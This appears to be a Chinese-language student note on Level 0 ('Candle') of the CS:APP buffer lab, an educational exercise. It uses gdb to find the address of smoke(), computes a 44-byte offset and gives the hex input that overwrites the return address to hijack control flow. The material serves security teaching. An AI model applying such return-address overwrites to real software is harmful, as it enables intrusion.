#buffer lab学习笔记

这个lab的任务和attach_lab一样，也是要求通过栈溢出控制程序流程完成相应任务
## Level 0: Candle (10 pts)
令test函数调用完getbuf函数后执行smoke函数
smoke函数源代码
```
void smoke()
{
printf("Smoke!: You called smoke()\n");
validate(0);
exit(0);
}
```
使用gdb查看smoke函数的地址
```
pwndbg> p smoke
$1 = {<text variable, no debug info>} 0x8048c18 <smoke>
```
然后计算栈溢出偏移是44，能覆盖到eip
构建如下格式的十六进制字符完成题目要求
```
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
18 8c 04 08
```
![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image5.png)
